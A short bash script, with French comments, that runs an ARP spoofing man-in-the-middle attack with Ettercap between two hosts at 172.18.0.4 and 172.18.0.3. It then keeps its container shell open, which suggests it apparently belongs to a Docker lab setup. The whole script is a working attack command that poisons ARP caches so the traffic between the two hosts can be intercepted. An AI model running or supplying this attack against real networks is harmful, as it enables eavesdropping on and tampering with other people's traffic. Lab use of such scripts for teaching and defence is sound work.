#!/bin/bash

echo "[INFO] Démarrage de l'attaque ARP Spoofing avec Ettercap..."
sudo ettercap -Tq -i eth0 -M arp:remote /172.18.0.4// /172.18.0.3//

exec bash  # Garde le conteneur ouvert après l'attaque
